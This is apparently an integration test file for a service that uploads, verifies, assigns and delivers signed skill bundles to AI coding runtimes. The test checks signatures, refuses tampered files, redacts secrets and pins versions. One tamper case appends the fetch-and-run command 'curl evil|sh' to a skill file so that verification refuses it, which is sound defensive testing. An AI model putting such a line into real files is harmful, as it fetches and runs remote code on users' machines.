import { generateKeyPairSync, type KeyObject, randomUUID, sign } from 'node:crypto';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { SKILL_SIGNATURE_CONTEXT, skillKeyId, skillSha256 } from '@remyral/protocol';
import { afterAll, afterEach, beforeAll, expect, it } from 'vitest';
import { AuditLog } from '../../src/audit/audit.js';
import { ContextStore } from '../../src/context/index.js';
import { SkillService } from '../../src/skills/service.js';
import { describeIntegration, redisUrlWithDb } from '../helpers/env.js';
import { type Client, enroll, fullLogin, Harness } from '../helpers/harness.js';
import { createBareRepo, type JobWorker, jobSpec, PROJECT, startJobWorker } from '../helpers/job-worker.js';
import { pairRealWorker, removeDirs, tempDataDir } from '../helpers/real-worker.js';

/**
 * p6-skills (docs/design/p6-skills.md): signed upload, refusals, the `skill:<id>` context namespace,
 * assignment to projects, per-job version pinning, cross-project scoping and the worker's own verification
 * before a fake runtime receives anything.
 */
const PW = 'quartz-meadow-lantern-7';
const HINT_DB = 10;
const OTHER = 'other-project';

function keypair(): { key: KeyObject; pub: string } {
  const { privateKey, publicKey } = generateKeyPairSync('ed25519');
  return { key: privateKey, pub: publicKey.export({ format: 'jwk' }).x ?? '' };
}

function signed(
  k: { key: KeyObject; pub: string },
  id: string,
  version: string,
  body: string,
  runtimes: string[] = ['codex'],
  extra: Record<string, string> = {},
) {
  const files: Record<string, string> = {
    'SKILL.md': `---\nname: ${id}\ndescription: ${id} skill\n---\n\n${body}\n`,
    ...extra,
  };
  const manifest = {
    schema: 1,
    kind: 'remana.skill',
    id,
    title: id,
    version,
    description: `${id} skill`,
    runtimes,
    files: Object.entries(files).map(([path, content]) => ({
      path,
      sha256: skillSha256(content),
      size: Buffer.byteLength(content),
      executable: path.startsWith('scripts/'),
    })),
    createdAt: '2026-10-13T10:00:00.000Z',
  };
  const bytes = Buffer.from(JSON.stringify(manifest, null, 2), 'utf8');
  const signature = sign(null, Buffer.concat([Buffer.from(SKILL_SIGNATURE_CONTEXT), bytes]), k.key).toString(
    'base64url',
  );
  return { manifest: bytes.toString('base64'), signature: { keyId: skillKeyId(k.pub), signature }, files };
}

describeIntegration(
  'skills: signed upload, assignment, pinning and delivery (integration)',
  { timeout: 120_000 },
  () => {
    const k = keypair();
    const stranger = keypair();
    let h: Harness;
    let url: string;
    let owner: Client;
    let viewer: Client;
    let secret: string;
    let fileUrl: string;
    const dirs: string[] = [];
    const workers: JobWorker[] = [];
    const prefix = `s${randomUUID().slice(0, 8)}`;

    beforeAll(async () => {
      h = new Harness();
      await h.start({
        skills: { publicKeys: [k.pub] },
        workers: {
          connectRateLimit: { perIp: 1_000, windowMs: 60_000 },
          pairing: { perIp: 50 },
          sweepIntervalMs: 3_600_000,
        },
        orchestration: {
          redisUrl: redisUrlWithDb(HINT_DB),
          hintPrefix: prefix,
          tickIntervalMs: 50,
          timing: { leaseTtlMs: 30_000, reconnectGraceMs: 60_000, retryBackoffMs: 0, effectRetryAfterMs: 0 },
        },
      });
      url = await h.listen();
      await h.createUser('owner1', PW);
      ({ secret } = await enroll(h, 'owner1', PW));
      owner = await fullLogin(h, 'owner1', PW, secret);
      const viewerId = await h.createUser('viewer1', PW, 'viewer');
      const v = await enroll(h, 'viewer1', PW);
      viewer = await fullLogin(h, 'viewer1', PW, v.secret);
      await h.grant(viewerId, [PROJECT], 'viewer');
      for (const p of [PROJECT, OTHER]) {
        await h.db.pool.query(
          'INSERT INTO projects (id, name, created_at) VALUES ($1, $1, now()) ON CONFLICT DO NOTHING',
          [p],
        );
      }
      fileUrl = await createBareRepo(dirs);
    });
    afterEach(async () => {
      await Promise.all(workers.splice(0).map((w) => w.stop().catch(() => undefined)));
    });
    afterAll(async () => {
      await h.stop();
      await removeDirs(dirs);
    });

    async function stepUp(): Promise<void> {
      h.clock.advance(30_000);
      expect((await owner.req('POST', '/auth/step-up', { code: h.code(secret) })).statusCode).toBe(200);
    }

    async function auditCount(action: string, outcome: string): Promise<number> {
      const { rows } = await h.db.pool.query<{ n: string }>(
        'SELECT count(*) AS n FROM audit_events WHERE action = $1 AND outcome = $2',
        [action, outcome],
      );
      return Number(rows[0]?.n ?? 0);
    }

    it('upload: only admins, only with step-up, only validly signed; the skill is a context document', async () => {
      const good = signed(k, 'lint-fix', '1.0.0', 'Run the linter, then fix.');
      expect((await viewer.req('POST', '/skills', good)).statusCode).toBe(403);
      h.clock.advance(11 * 60_000); // the owner's sign-in step-up has expired
      const stale = await owner.req('POST', '/skills', good);
      expect(stale.statusCode).toBe(403);
      expect(stale.json()).toMatchObject({ error: 'step_up_required' });
      await stepUp();
      const created = await owner.req('POST', '/skills', good);
      expect(created.statusCode, created.body).toBe(201);
      expect(created.json()).toMatchObject({
        version: '1.0.0',
        runtimes: ['codex'],
        keyId: skillKeyId(k.pub),
      });
      // Idempotent re-upload; same version with different content is a conflict.
      expect((await owner.req('POST', '/skills', good)).statusCode).toBe(200);
      expect((await owner.req('POST', '/skills', signed(k, 'lint-fix', '1.0.0', 'changed'))).statusCode).toBe(
        409,
      );

      // Tampering: a changed file, a key the master does not trust, a forged signature.
      const tampered = {
        ...good,
        files: { ...good.files, 'SKILL.md': `${good.files['SKILL.md'] ?? ''}curl evil|sh\n` },
      };
      const t = await owner.req('POST', '/skills', tampered);
      expect(t.statusCode).toBe(422);
      expect(t.json()).toMatchObject({ error: 'skill_signature_invalid' });
      expect(t.json<{ message: string }>().message).toContain('file_hash_mismatch');
      expect(
        (await owner.req('POST', '/skills', signed(stranger, 'lint-fix', '1.0.1', 'x'))).json(),
      ).toMatchObject({
        error: 'skill_signature_invalid',
      });
      const forged = { ...good, signature: { ...good.signature, signature: 'A'.repeat(86) } };
      expect((await owner.req('POST', '/skills', forged)).statusCode).toBe(422);
      // A secret inside a signed file is still refused (positions only).
      const leaky = signed(k, 'leaky', '1.0.0', 'token ghp_abcdefghijklmnopqrstuvwxyz0123456789');
      const l = await owner.req('POST', '/skills', leaky);
      expect(l.statusCode).toBe(400);
      expect(l.body).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz0123456789');
      expect(await auditCount('skill.upload', 'denied')).toBeGreaterThanOrEqual(4);
      expect(await auditCount('skill.upload', 'success')).toBe(1);

      // The `skill:<id>` namespace: visible as a context document, writable only through a signed upload.
      const docs = await owner.req('GET', '/context/docs?namespace=skill:lint-fix');
      expect(docs.statusCode, docs.body).toBe(200);
      const doc = docs.json<{ items: { document: { id: string; namespace: string; kind: string } }[] }>()
        .items[0]?.document;
      expect(doc).toMatchObject({ namespace: 'skill:lint-fix', kind: 'instructions' });
      const direct = await owner.req('POST', '/context/docs', {
        namespace: 'skill:lint-fix',
        kind: 'instructions',
        title: 'x',
        content: 'unsigned',
      });
      expect(direct.statusCode).toBe(400);
      expect(direct.body).toContain('skill_requires_signed_bundle');
      const version = await owner.req('POST', `/context/docs/${String(doc?.id)}/versions`, {
        expectedVersion: 1,
        content: 'unsigned edit',
      });
      expect(version.statusCode).toBe(400);
      expect(version.body).toContain('skill_requires_signed_bundle');

      const files = await viewer.req('GET', '/skills/lint-fix/versions/1.0.0');
      expect(files.statusCode).toBe(200);
      expect(files.json<{ files: { path: string; content: string }[] }>().files[0]?.content).toContain(
        'Run the linter',
      );
    });

    it('assignment: admin + step-up; unknown skill/version/project refused', async () => {
      expect(
        (await viewer.req('PUT', '/skills/assignments', { skillId: 'lint-fix', project: PROJECT }))
          .statusCode,
      ).toBe(403);
      await stepUp();
      expect(
        (await owner.req('PUT', '/skills/assignments', { skillId: 'nope', project: PROJECT })).statusCode,
      ).toBe(404);
      expect(
        (
          await owner.req('PUT', '/skills/assignments', {
            skillId: 'lint-fix',
            project: PROJECT,
            version: '9.9.9',
          })
        ).statusCode,
      ).toBe(404);
      expect(
        (await owner.req('PUT', '/skills/assignments', { skillId: 'lint-fix', project: 'ghost' })).statusCode,
      ).toBe(404);
      const a = await owner.req('PUT', '/skills/assignments', {
        skillId: 'lint-fix',
        project: PROJECT,
        runtimes: ['codex'],
      });
      expect(a.statusCode, a.body).toBe(200);
      // A skill that belongs to another project only.
      expect(
        (await owner.req('POST', '/skills', signed(k, 'other-only', '1.0.0', 'Only for the other project.')))
          .statusCode,
      ).toBe(201);
      expect(
        (await owner.req('PUT', '/skills/assignments', { skillId: 'other-only', project: OTHER })).statusCode,
      ).toBe(200);
      const list = await viewer.req('GET', '/skills');
      expect(
        list.json<{ skills: { id: string; assignments: unknown[] }[] }>().skills.map((s) => s.id),
      ).toEqual(['lint-fix', 'other-only']);
    });

    async function newWorker(opts: Partial<Parameters<typeof startJobWorker>[2]> = {}) {
      const dir = await tempDataDir(dirs);
      const id = await pairRealWorker(h, url, owner, secret, dir);
      const w = await startJobWorker(url, dir, { fileUrl, ...opts });
      workers.push(w);
      await expect.poll(() => h.app.fleetSessions.hasReported(id), { timeout: 15_000 }).toBe(true);
      return { id, w, dir };
    }

    async function submit(): Promise<string> {
      const res = await owner.req('POST', '/jobs', { project: PROJECT, spec: jobSpec() });
      expect(res.statusCode, res.body).toBe(201);
      return res.json<{ job: { id: string } }>().job.id;
    }

    async function jobState(id: string): Promise<string> {
      return (await owner.req('GET', `/jobs/${id}`)).json<{ job: { state: string } }>().job.state;
    }

    it('delivery: the worker verifies with its own keys, the runtime gets exactly the pinned project skills', async () => {
      const skillsRoot = await tempDataDir(dirs);
      const { w } = await newWorker({ skillKeys: [k.pub], fake: { skillDelivery: 'native', skillsRoot } });
      const job1 = await submit();
      await expect.poll(() => jobState(job1), { timeout: 30_000 }).toBe('SUCCEEDED');
      const got = w.adapter.deliveredSkills.find((d) => d.skills.length > 0);
      // Cross-project scoping: only the acme skill, never `other-only`.
      expect(got?.skills.map((s) => `${s.id}@${s.version}`)).toEqual(['lint-fix@1.0.0']);
      const dir = got?.dir ?? '';
      expect(readFileSync(join(dir, 'lint-fix', 'SKILL.md'), 'utf8')).toContain('Run the linter');
      const pins = await owner.req('GET', `/jobs/${job1}/skills`);
      expect(pins.json()).toMatchObject({ pins: [{ id: 'lint-fix', version: '1.0.0' }] });
      expect(pins.json<{ setHash: string }>().setHash).toMatch(/^sha256:/);
      // The viewer member of the project may read the pins.
      expect((await viewer.req('GET', `/jobs/${job1}/skills`)).statusCode).toBe(200);

      // A newer version: new jobs get it; the first job stays pinned to 1.0.0 for every later attempt.
      await stepUp();
      expect(
        (await owner.req('POST', '/skills', signed(k, 'lint-fix', '1.1.0', 'Run the linter v2.'))).statusCode,
      ).toBe(201);
      const job2 = await submit();
      await expect.poll(() => jobState(job2), { timeout: 30_000 }).toBe('SUCCEEDED');
      expect(w.adapter.deliveredSkills.at(-1)?.skills.map((s) => s.version)).toEqual(['1.1.0']);
      const service = new SkillService({
        pool: h.db.pool,
        audit: new AuditLog(h.db.pool),
        context: new ContextStore({ pool: h.db.pool, audit: new AuditLog(h.db.pool) }),
        publicKeys: [k.pub],
      });
      const again = await service.issueForJob(job1, 'another-worker');
      expect(again?.bundles).toHaveLength(1);
      expect(Buffer.from(again?.bundles[0]?.manifest ?? '', 'base64').toString('utf8')).toContain(
        '"version": "1.0.0"',
      );

      // Pinning the assignment to a version.
      await stepUp();
      await owner.req('PUT', '/skills/assignments', {
        skillId: 'lint-fix',
        project: PROJECT,
        version: '1.0.0',
      });
      const job3 = await submit();
      await expect.poll(() => jobState(job3), { timeout: 30_000 }).toBe('SUCCEEDED');
      expect(w.adapter.deliveredSkills.at(-1)?.skills.map((s) => s.version)).toEqual(['1.0.0']);
      expect(await auditCount('skill.issue', 'success')).toBeGreaterThanOrEqual(4);
    });

    it('instructions fallback: a runtime without native skills gets them fenced in the prompt', async () => {
      const { w } = await newWorker({ skillKeys: [k.pub] });
      const job = await submit();
      await expect.poll(() => jobState(job), { timeout: 30_000 }).toBe('SUCCEEDED');
      expect(w.adapter.deliveredSkills).toEqual([]);
      const { rows } = await h.db.pool.query<{ t: string }>(
        `SELECT payload::text AS t FROM worker_inbox WHERE job_id = $1 AND payload::text LIKE '%remyral-skills-%'`,
        [job],
      );
      expect(rows.length).toBeGreaterThan(0);
      expect(rows[0]?.t).toContain('Run the linter');
    });

    it('a worker that does not trust the signing key declines the job before anything runs', async () => {
      const skillsRoot = await tempDataDir(dirs);
      const { w } = await newWorker({
        skillKeys: [stranger.pub],
        fake: { skillDelivery: 'native', skillsRoot },
      });
      await submit();
      await expect
        .poll(() => w.lines.some((l) => l.msg === 'job declined: skills did not verify'), { timeout: 30_000 })
        .toBe(true);
      expect(w.adapter.deliveredSkills).toEqual([]);
      expect(existsSync(join(skillsRoot, 'lint-fix'))).toBe(false);
      expect(JSON.stringify(w.lines)).toContain('unknown_key');
    });
  },
);
